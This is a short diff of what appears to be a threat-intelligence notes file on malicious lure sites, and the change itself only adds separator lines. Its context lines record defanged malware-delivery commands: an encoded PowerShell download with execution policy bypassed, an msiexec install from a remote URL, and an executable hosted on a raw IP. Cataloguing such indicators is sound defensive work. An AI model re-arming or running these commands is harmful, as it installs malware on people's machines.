@@ -8,6 +8,8 @@ powershell -Command "$file='C:\Users\Public\JGS_EXPRESS_INC_Broker_Carrier_Agree
 hxxp[:]//195[.]123[.]240[.]159[:]81/files/agreement[.]exe
 ```
 
+----
+
 <img src="https://iad.microlink.io/aDF2rBnA_FEJwGVl7GP38weLXxMSB8hGMhZH6brDYZGCtdBVhNOM4N6tvnzVlv4KQXa5OBdYp0AIuqUHwESazw.png" width="100%">
 
 ```
@@ -18,11 +20,15 @@ powershell /ep bypass /enc JABhAD0AKABOAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXA
 hxxps[:]//psee[.]io/7kptlb
 ```
 
+----
+
 ```
 hxxps[:]//www[.]localgrapevines[.]com
 
 msiexec /i hxxps[:]//suzume-design[.]com/cloudflare
 ```
+
+----
 
 <img src="https://iad.microlink.io/wNHRtebcnZy9E5_o2qzoonIj5ZJyciOUFF4IGlJwjNFzT7n4qpawZMmWxzal8GlGxqSko2oYXPWkGGpALpyxRw.png" width="100%">
 
